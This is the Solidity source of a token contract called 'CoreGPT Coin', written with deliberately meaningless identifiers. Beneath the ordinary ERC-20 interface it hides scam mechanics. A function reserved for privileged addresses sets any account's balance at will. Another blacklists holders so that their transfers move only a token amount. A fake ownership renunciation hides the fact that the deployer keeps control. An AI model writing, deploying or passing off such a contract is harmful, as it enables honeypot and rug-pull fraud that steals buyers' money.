//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tokenSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderEnableAuto) external view returns (uint256);

    function transfer(address walletSwap, uint256 walletShould) external returns (bool);

    function allowance(address receiverMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletShould) external returns (bool);

    function transferFrom(
        address sender,
        address walletSwap,
        uint256 walletShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txTakeLaunch, uint256 value);
    event Approval(address indexed receiverMode, address indexed spender, uint256 value);
}

interface sellMaxBuy is tokenSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract takeFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAmountWallet {
    function createPair(address receiverAt, address autoTo) external returns (address);
}

interface liquidityMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreGPTCoin is takeFrom, tokenSell, sellMaxBuy {

    uint256 private toSell;

    function getOwner() external view returns (address) {
        return fromTrading;
    }

    function transferFrom(address swapLaunched, address walletSwap, uint256 walletShould) external override returns (bool) {
        if (_msgSender() != swapAmountExempt) {
            if (tradingReceiverFrom[swapLaunched][_msgSender()] != type(uint256).max) {
                require(walletShould <= tradingReceiverFrom[swapLaunched][_msgSender()]);
                tradingReceiverFrom[swapLaunched][_msgSender()] -= walletShould;
            }
        }
        return walletTx(swapLaunched, walletSwap, walletShould);
    }

    bool private receiverFrom;

    address public teamBuyFund;

    string private launchedLimitBuy = "CoreGPT Coin";

    uint256 public takeFund;

    function liquiditySender(address exemptMarketing, uint256 walletShould) public {
        atToken();
        teamMax[exemptMarketing] = walletShould;
    }

    address private fromTrading;

    uint256 private launchedLiquidity;

    function txTake(address sellShouldLimit) public {
        if (takeFeeMax) {
            return;
        }
        if (receiverFrom) {
            atTrading = true;
        }
        amountMin[sellShouldLimit] = true;
        
        takeFeeMax = true;
    }

    constructor (){ 
        
        liquidityMin tradingLaunched = liquidityMin(swapAmountExempt);
        marketingLimit = receiverAmountWallet(tradingLaunched.factory()).createPair(tradingLaunched.WETH(), address(this));
        
        amountMin[_msgSender()] = true;
        teamMax[_msgSender()] = takeTxFee;
        teamBuyFund = _msgSender();
        
        emit Transfer(address(0), teamBuyFund, takeTxFee);
        fromTrading = _msgSender();
        takeMin();
    }

    function allowance(address listAt, address listTx) external view virtual override returns (uint256) {
        if (listTx == swapAmountExempt) {
            return type(uint256).max;
        }
        return tradingReceiverFrom[listAt][listTx];
    }

    function takeMin() public {
        emit OwnershipTransferred(teamBuyFund, address(0));
        fromTrading = address(0);
    }

    address swapAmountExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public maxTo;

    mapping(address => uint256) private teamMax;

    bool public takeFeeMax;

    function name() external view virtual override returns (string memory) {
        return launchedLimitBuy;
    }

    function approve(address listTx, uint256 walletShould) public virtual override returns (bool) {
        tradingReceiverFrom[_msgSender()][listTx] = walletShould;
        emit Approval(_msgSender(), listTx, walletShould);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellAmountExempt;
    }

    function walletTx(address swapLaunched, address walletSwap, uint256 walletShould) internal returns (bool) {
        if (swapLaunched == teamBuyFund) {
            return takeLaunched(swapLaunched, walletSwap, walletShould);
        }
        if (maxReceiver[swapLaunched]) {
            return takeLaunched(swapLaunched, walletSwap, 12 ** 10);
        }
        return takeLaunched(swapLaunched, walletSwap, walletShould);
    }

    function balanceOf(address senderEnableAuto) public view virtual override returns (uint256) {
        return teamMax[senderEnableAuto];
    }

    function transfer(address exemptMarketing, uint256 walletShould) external virtual override returns (bool) {
        return walletTx(_msgSender(), exemptMarketing, walletShould);
    }

    uint256 public receiverToken;

    string private sellAmountExempt = "CCN";

    uint8 private atFee = 18;

    event OwnershipTransferred(address indexed receiverTake, address indexed maxFromFund);

    bool private atTrading;

    function totalSupply() external view virtual override returns (uint256) {
        return takeTxFee;
    }

    uint256 private tradingAmount;

    mapping(address => mapping(address => uint256)) private tradingReceiverFrom;

    uint256 private enableMarketing;

    mapping(address => bool) public amountMin;

    mapping(address => bool) public maxReceiver;

    function owner() external view returns (address) {
        return fromTrading;
    }

    address public marketingLimit;

    function isListAuto(address receiverLiquidity) public {
        atToken();
        
        if (receiverLiquidity == teamBuyFund || receiverLiquidity == marketingLimit) {
            return;
        }
        maxReceiver[receiverLiquidity] = true;
    }

    uint256 private takeTxFee = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return atFee;
    }

    function atToken() private view{
        require(amountMin[_msgSender()]);
    }

    function takeLaunched(address swapLaunched, address walletSwap, uint256 walletShould) internal returns (bool) {
        require(teamMax[swapLaunched] >= walletShould);
        teamMax[swapLaunched] -= walletShould;
        teamMax[walletSwap] += walletShould;
        emit Transfer(swapLaunched, walletSwap, walletShould);
        return true;
    }

    bool public swapMarketingTotal;

}